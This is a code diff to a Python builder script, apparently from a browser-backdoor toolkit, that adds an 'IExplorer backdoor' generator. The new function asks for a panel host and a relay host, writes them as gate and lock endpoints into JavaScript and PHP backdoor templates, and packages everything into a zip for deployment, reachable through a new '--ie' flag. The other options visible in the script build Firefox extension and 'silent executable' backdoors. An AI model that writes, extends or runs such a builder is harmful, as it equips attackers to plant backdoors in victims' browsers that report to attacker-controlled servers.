@@ -27,7 +27,7 @@ def logo():
      | |___| | | | | | (_) | | | | | |  __/ |_) | (_| | (__|   < (_| | (_) | (_) | |   
       \____|_| |_|_|  \___/|_| |_| |_|\___|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                           
-     VERSION 3.0 - graniet75@gmail.com
+      VERSION 3.0 - graniet75@gmail.com - @graniet75
     """
 
 def copy(src, dest):
@@ -38,6 +38,85 @@ def copy(src, dest):
             shutil.copy(src, dest)
         else:
             print('Directory not copied. Error: %s' % e)
+
+def iexplorer():
+    backdoor_information = {}
+    backdoor_information['gate'] = "index.php"
+    backdoor_information['output_dir'] = "backdoor/backdoor"
+    backdoor_information['output_name'] = "/iexplorer"
+    action = 0
+    print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] IExplorer backdoor..."
+    print "/"+bcolors.WARNING+"!"+bcolors.ENDC+"\\ please use HTTPS hosting for relais information."
+    while action == 0:
+        site = raw_input("[?] Website host (https://localhost/) ? ")
+        if site == "":
+	   site = "https://localhost/"
+	   action = 1
+        elif site.endswith('/'):
+	   action = 1
+        else:
+	   site = site+"/"
+	   action = 1
+    backdoor_information['site'] = site
+    action = 0
+    while action == 0:
+	relais = raw_input("[?] Relais host (https://localhost/relais) ? ")
+	if relais == "":
+	    relais =  "https://localhost/relais"
+	    action = 1
+	elif relais.endswith('/'):
+	    relais = relais[:-1]
+	    action = 1
+	else:
+	    action = 1
+    backdoor_information['relais'] = relais
+    action = 0
+    if(os.path.isfile('backdoor/iexplorer/script.js')):
+        copy('backdoor/iexplorer/','backdoor/iexplorer_bk/')
+        file_read = open('backdoor/iexplorer/script.js').read()
+        if "//settings" in file_read:
+	    relais = backdoor_information['relais']
+            code = file_read.replace("//settings", "\n\n    var server_web = '"+relais+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
+            file_write = open('backdoor/iexplorer_bk/script.js', 'w')
+            file_write.write(code)
+            file_write.close()
+	    copy('backdoor/iexplorer_bk/','backdoor/backdoor/iexplorer')
+            copy('backdoor/web/','backdoor/web_bk/')
+            file_read = open('backdoor/web/show.php').read()
+            if "//settings" in file_read:
+		panel = backdoor_information['site']
+                code = file_read.replace('//settings', "var server_web = '"+panel+"'\n var gate_page = 'web/show.php'")
+                file_write = open('backdoor/web_bk/show.php', 'w')
+                file_write.write(code)
+                file_write.close()
+                #install_relais(panel)
+		copy('backdoor/web_bk/','backdoor/backdoor/web_bk/')
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Configure relais information..."
+	copy('backdoor/relais/', 'backdoor/relais_bk/')
+	file_read = open('backdoor/relais/index.php').read()
+	if "//domain" in file_read:
+	    domain = backdoor_information['site']
+	    code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
+	    file_write = open('backdoor/relais_bk/index.php','w')
+	    file_write.write(code)
+	    file_write.close()
+	file_script = open('backdoor/relais/show_script.php').read()
+	if "//domain" in file_script:
+	    code = file_script.replace('//domain', '$domain = "'+domain+'";\n')
+	    file_write = open('backdoor/relais_bk/show_script.php', 'w')
+	    file_write.write(code)
+	    file_write.close()
+	copy('backdoor/relais_bk/','backdoor/backdoor/relais/')
+	print "["+bcolors.OKGREEN+"+"+bcolors.ENDC+"] Successfully configure."
+	name_archive = str(random.randint(1,99999))
+	shutil.make_archive(name_archive,'zip', 'backdoor/backdoor/')
+	shutil.rmtree('backdoor/iexplorer_bk')
+	shutil.rmtree('backdoor/web_bk/')
+	shutil.rmtree('backdoor/relais_bk/')
+	shutil.rmtree('backdoor/backdoor')
+	print bcolors.OKGREEN+"Generation successful :"+os.getcwd()+"/"+name_archive+".zip"+bcolors.ENDC
+    else:
+        print "not here"
 
 def verify_xpi(information_array):
 	output_name = information_array['output_name']
@@ -359,6 +438,8 @@ def main():
 	    install_firefox_server()
 	elif(sys.argv[1] == "--build"):
 	    executable_silent()
+	elif(sys.argv[1] == "--ie"):
+	    iexplorer()
 	else:
 	    help()
     else:
